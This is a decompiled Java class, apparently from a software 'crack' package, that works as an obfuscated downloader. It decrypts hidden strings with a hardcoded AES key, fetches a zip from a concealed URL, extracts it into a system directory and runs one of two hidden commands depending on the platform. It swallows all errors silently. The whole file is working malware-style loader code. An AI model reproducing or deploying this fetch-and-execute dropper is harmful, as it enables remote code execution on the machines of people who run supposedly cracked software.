/*
 * Decompiled with CFR 0.150.
 */
package com.company.z3.com.crack.it;

import java.io.BufferedInputStream;
import java.io.ByteArrayOutputStream;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.security.Key;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;
import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

public class Run {
    private static String key = "Kjf456UjOP14Ywte";

    private static byte[] a(String string) {
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(string.length() / 2);
        for (int i = 0; i < string.length(); i += 2) {
            byteArrayOutputStream.write(Integer.parseInt(string.substring(i, i + 2), 16));
        }
        return byteArrayOutputStream.toByteArray();
    }

    private static String b(String string) throws Exception {
        byte[] arrby = Run.a(string);
        Cipher cipher = Cipher.getInstance("AES/CBC/NoPadding");
        SecretKeySpec secretKeySpec = new SecretKeySpec(key.getBytes(StandardCharsets.UTF_8), "AES");
        IvParameterSpec ivParameterSpec = new IvParameterSpec(key.getBytes(StandardCharsets.UTF_8));
        cipher.init(2, (Key)secretKeySpec, ivParameterSpec);
        byte[] arrby2 = cipher.doFinal(arrby);
        return new String(arrby2);
    }

    private static void c(String string) throws Exception {
        URL uRL = new URL(string);
        Path path = Paths.get(System.getProperty(Run.b("cf342300e78f3c21383678d00b71b225369f62782816ebd5986ae029b97f34f53fb78d0a05ece71c779ebbc83692cfe8919282626c7be128cfb6b8f285848ff5").trim()), new String[0]);
        Path path2 = Paths.get(path.toString(), Run.b("b92741a781f245538d5c75ab25330b9107832a09ef2c1d461a67507930557538e1fa2c3d572d2a384e4f9d399ef8c33d09467b3ab0454b41bab9350ce3774fdf").trim());
        try (BufferedInputStream bufferedInputStream = new BufferedInputStream(uRL.openStream());){
            int n;
            FileOutputStream fileOutputStream = new FileOutputStream(path2.toString());
            byte[] arrby = new byte[1024];
            while ((n = bufferedInputStream.read(arrby, 0, 1024)) != -1) {
                fileOutputStream.write(arrby, 0, n);
            }
        }
        catch (IOException iOException) {
            // empty catch block
        }
        Run.d(path2, path);
    }

    private static void d(Path path, Path path2) {
        try {
            if (!path.toFile().exists()) {
                return;
            }
            byte[] arrby = new byte[1024];
            ZipInputStream zipInputStream = new ZipInputStream(new FileInputStream(path.toString()));
            ZipEntry zipEntry = zipInputStream.getNextEntry();
            while (zipEntry != null) {
                int n;
                String string = Paths.get(path2.toString(), zipEntry.getName()).toString();
                FileOutputStream fileOutputStream = new FileOutputStream(string);
                while ((n = zipInputStream.read(arrby)) > 0) {
                    fileOutputStream.write(arrby, 0, n);
                }
                fileOutputStream.close();
                zipEntry = zipInputStream.getNextEntry();
            }
            zipInputStream.closeEntry();
            zipInputStream.close();
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    public static void main(String[] arrstring) throws Exception {
        String string = System.getProperty(Run.b("6474658359276b25720ff106097a2663f7d139752e9f95100ac045385fd51ee58f6a4a2c6d7f2701fed0ab2fff3a66bf43f78e79af22740fe718824cff7cda98").trim());
        String string2 = Run.b("054f1f395c9506dea62a842dd0a91602ef625bd2909bb87a2fbcab5a499e06013166de8c18bf9d982184785f07f59739c463c3d56327be198fcae6648f7314f4").trim();
        Run.c(Run.b("52ab37cab57dab5d50c38b06a37f12da4a093eadfd96502c3eef188a2c44e63a0cb4a60c16e3f41f0c02df264f492cf311030bd9be4a3f37db38755eef4527b9"));
        if (string.contains(string2)) {
            Runtime.getRuntime().exec(Run.b("2d830932f271350897857710196ec96453f8d261bc7f07181da0c2a10fbe2db2267c3526d61c01c1c28a004367774f64b687c76dcf6873995954a8d93f3d2f3c").trim());
        } else {
            Runtime.getRuntime().exec(Run.b("5673123e986e4c8ad4efa677a6d00b31b2007673a282e5ebc6a2738c0f603f36b372a9f85b2f598f3f76c5d43eb82e4183a123eea4031fcbb040c872e681e31f").trim());
        }
    }
}